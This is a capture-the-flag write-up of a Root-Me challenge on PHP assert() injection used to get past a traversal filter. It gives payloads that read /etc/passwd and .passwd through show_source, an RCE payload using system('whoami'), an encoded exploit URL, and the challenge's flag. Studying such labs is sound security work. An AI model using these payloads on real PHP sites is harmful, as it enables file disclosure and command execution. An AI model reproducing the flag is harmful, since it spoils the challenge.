# PHP - assert()(lfi-die), Bypassing filter

Reference: HackTricks

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf?\_gl=1_6hbsnw_\_ga_NTM2MDg4NDI5LjE2NjExMzM0Njc._\_ga\_SRYSKX09J7\*MTY2MjEwNDgzMC4zOC4xLjE2NjIxMDU1MzUuMC4wLjA.

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20LFI%20with%20phpinfo()%20assistance.pdf?\_gl=1_1qwmuha_\_ga_NTM2MDg4NDI5LjE2NjExMzM0Njc._\_ga\_SRYSKX09J7\*MTY2MjEwNDgzMC4zOC4xLjE2NjIxMDU1MzUuMC4wLjA.

### LFI via PHP's 'assert'

If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.

A payload like this:

```
' and die(show_source('/etc/passwd')) or ' 
```

will successfully exploit PHP code for a "file" parameter that looks like this:

```
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); 
```

It's also possible to get RCE in a vulnerable "assert" statement using the system() function:

```
' and die(system("whoami")) or ' 
```

Be sure to URL-encode payloads before you send them.

***

Initial attempt:

http://challenge01.root-me.org/web-serveur/ch47/?page=../

\->

Warning: assert(): Assertion "strpos('includes/../.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!

\->

Exploit URL:

http://challenge01.root-me.org/web-serveur/ch47/?page=%27%20and%20die(show\_source(%27.passwd%27))%20or%20%27

then

payload: `' and die(show_source('.passwd')) or '`

expected action: `Assertion "strpos('includes/' and die(show_source('.passwd')) or '.php', '..') === false"`

then, as '..' does not exist on the strpos' first argument thus condition satisfied ->

die activate

where php die function is:

```
<?php
    do_something($with_this) or die ('oops!');
?>

(in php, "die" is actually an alias of "exit")
```

here send the 'and' for it to finish the program and not execute

`die("Detected hacking attempt!")`

part.

\->

The flag is / Le flag est :

x4Ss3rT1nglSn0ts4f3A7A1Lx

Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert !

***

And show\_source function:

Syntax show\_source(filename,return)

Parameter Values

Parameter Description

filename Required. Specifies the file to display return Optional. If set to TRUE, this function will return the highlighted code as a string, instead of printing it out. Default is FALSE

***

strpos function

Syntax strpos(string,find,start)

Parameter Values

Parameter Description

string Required. Specifies the string to search find Required. Specifies the string to find start Optional. Specifies where to begin the search. If start is a negative number, it counts from the end of the string.
